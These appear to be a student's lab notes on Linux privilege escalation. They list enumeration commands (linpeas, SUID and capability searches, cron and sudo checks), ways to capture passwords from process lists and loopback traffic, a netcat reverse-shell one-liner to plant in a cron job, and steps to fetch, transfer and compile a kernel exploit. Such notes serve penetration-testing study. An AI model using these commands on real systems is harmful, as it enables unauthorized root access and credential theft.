Linux privilege escalation

run command over ssh super helpful
cd /usr/share/peass/linpeas
ssh student@192.168.235.52 -p 2222 'bash -s' < linpeas.sh

try polkit pkexec, just try it.
Processes
ps -aux

route tables
route or routel

find connections 

ss -anp

Cron stuff

Show permissions for every folder that starts with the name cron recursively.
ls -lah /etc/cron*

crontab -l
sudo crontab -l (may be runnable if user has the permission)

dpkg -l (list every installed package

find all writable directory by current user
find / -writable -type d 2>/dev/null

NOTE: Try 
find / -writable -type f 2>/dev/null for writable scripts that may be hidden inside a directory!

find all permissions with SUID set. (allows you to
find / -perm -u=s -type f 2>/dev/null

find all capabilities with SUID
/usr/sbin/getcap -r / 2>/dev/null

Mounts - In summary, mount shows the current mount status, /etc/fstab represents the expected configuration, and lsblk provides information about the block devices and their partitions present on the system.

cat /etc/fstab

mount

lsblk

lsmod - list all kernel modules

list module info using /sbin/modinfo mod

group 0 is root, 42 is shadow.... Be careful if you change your accounts info, you may break your only foot-point. its better to just make a new account


sudo -l lets you check what this account can run as sudo, super useful!

check the following for potentially stored plain text creds... immediately try to do su - root as these are likely creds needed for higher privs scripts...

.bashrc

.bashanything really

env

Capture Creds

watch -n 1 "ps aux | grep pass" >> outputfile

if you have tcpdump in sudo -l...

sudo tcpdump -i lo -A | grep "pass"

Cron Jobs

1) scan system level cron jobs
grep "CRON" /var/log/syslog

2) edit a cronjob to get a reverse shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
- this delete the fifo pipe if exists, creates another one, cats its contents to a shell with interactive i flag and redirect errors to error log, write to fifo pipe

kernal exploits...
get os flavor info
cat /etc/issue
result : Ubuntu 16.04.4 LTS \n \l

get kernal info
uname -r 
4.4.0-116-generic

arch 
x86_64

put it all together (kernal exploit) ...

search for exploit
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
use the newest version that matches what you got... I'm assuming you can tell which one is newer using the number at the end example 45010 is newer than 42275
also becareful that 4.13.9 kernal is newer than 4.4.0.... I'm not sure why I immediately assumed the opposite.

Copy to your pwd
cp /usr/share/exploitdb/exploits/linux/local/45010.c . 

cat first 20 lines of it to search for instructions
head 45010.c -n 20

move it to your target if they have a compiler... let them do all the work. DO NOT FORGET THE : at the end. You will just make a copy on your own device
scp cve-2017-16995.c user@ip:

compile it using instructions, change name if needed...
gcc cve-2017-16995.c -o cve-2017-16995

use file to verify everything was made correctly
file cve-2017-16995



